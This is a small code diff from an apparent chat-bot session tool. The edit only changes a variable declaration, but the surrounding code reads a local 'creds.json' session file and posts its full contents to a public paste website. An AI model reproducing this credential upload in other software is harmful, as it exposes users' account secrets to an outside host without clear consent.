@@ -57,7 +57,7 @@ const {
                         const authfile = (`./session/creds.json`)
                         await delay(1000 * 10)
 let fil = await fs.readFileSync("./session/creds.json", "utf-8");
-                        const link = await axios.post('http://paste.c-net.org/',""+fil, {
+                        let link = await axios.post('http://paste.c-net.org/',"" + fil, {
                             headers: {
 "Content-Type": 
 "application/x-www-form-urlencoded",
